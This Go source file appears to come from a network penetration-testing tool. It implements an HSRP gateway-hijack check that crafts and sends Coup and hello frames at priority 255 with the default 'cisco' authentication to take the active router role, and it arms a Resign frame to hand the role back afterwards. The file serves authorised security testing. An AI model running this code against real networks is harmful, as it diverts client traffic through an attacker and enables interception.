// hsrp.go implements the HSRP active-router hijack check. Impact
// temporary, restore active, affects clients: the Coup (opcode 1,
// priority 255) and the hello that follows take the active router role
// for the group, so the clients' gateway traffic goes to the attack leg,
// and the armed Resign (opcode 2) hands the role back when the run ends.

package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

type hsrpFinding struct {
	Action   string `json:"action"`
	Opcode   string `json:"opcode"`
	Group    uint8  `json:"group"`
	Priority uint8  `json:"priority"`
	VIP      string `json:"vip"`
	Restore  string `json:"restore"`
}

// RunHSRP arms a resign teardown before sending a Coup and hello for the
// target's group and virtual IP from the attack leg's own addresses. The
// group is bounded at 255, the one octet the HSRPv1 group field holds, so
// a larger group is the operator's mistake and not another group. The
// priority of 255 and the authentication string are probe content. The
// verdict is pending: coup acceptance needs a hello listener it does not
// have. Craft and send errors carry operation context.
func RunHSRP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldGroup, check.FieldVirtualIP); err != nil {
		return check.Verdict{}, err
	}
	if err := deps.Target.Within(check.FieldGroup, 255); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	group := uint8(*deps.Target.Group)
	priority := uint8(255)
	vip := deps.Target.VirtualIP

	// Arm the resign teardown before the first frame.
	resignPkt, err := craftHSRP(addr, nl.HSRPOpcodeResign, nl.HSRPStateStandby, priority, group, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: craft resign")
	}
	deps.Teardown.Arm("hsrp-resign", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, resignPkt)
	})

	// Send the Coup to steal the active role.
	coupPkt, err := craftHSRP(addr, nl.HSRPOpcodeCoup, nl.HSRPStateActive, priority, group, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: craft coup")
	}
	if err := deps.AttackLeg.Send(ctx, coupPkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: send coup")
	}

	// Send a hello to maintain the active state.
	helloPkt, err := craftHSRP(addr, nl.HSRPOpcodeHello, nl.HSRPStateActive, priority, group, vip)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: craft hello")
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "hsrp: send hello")
	}

	detail, _ := json.Marshal(hsrpFinding{
		Action:   "hsrp-coup",
		Opcode:   "coup",
		Group:    group,
		Priority: priority,
		VIP:      vip.String(),
		Restore:  "hsrp-resign",
	})
	deps.Emitter.Finding("hsrp", detail)

	return check.Pending("no observable: coup acceptance needs a hello listener"), nil
}

// craftHSRP builds a full HSRP frame: Ethernet → IPv4 → UDP(1985) → HSRP.
func craftHSRP(addr link.Addr, opcode nl.HSRPOpcode, state nl.HSRPState, priority, group uint8, vip net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       hsrpDstMAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    addr.IPv4,
		DstIP:    net.IPv4(224, 0, 0, 2),
	}
	udp := &layers.UDP{
		SrcPort: 1985,
		DstPort: 1985,
	}
	hsrp := &nl.HSRP{
		Version:   0,
		Opcode:    opcode,
		State:     state,
		Hellotime: 3,
		Holdtime:  10,
		Priority:  priority,
		Group:     group,
		Auth:      [8]byte{'c', 'i', 's', 'c', 'o', 0, 0, 0},
		VirtualIP: vip.To4(),
	}
	return craftUDPLayer(eth, ip, udp, hsrp)
}
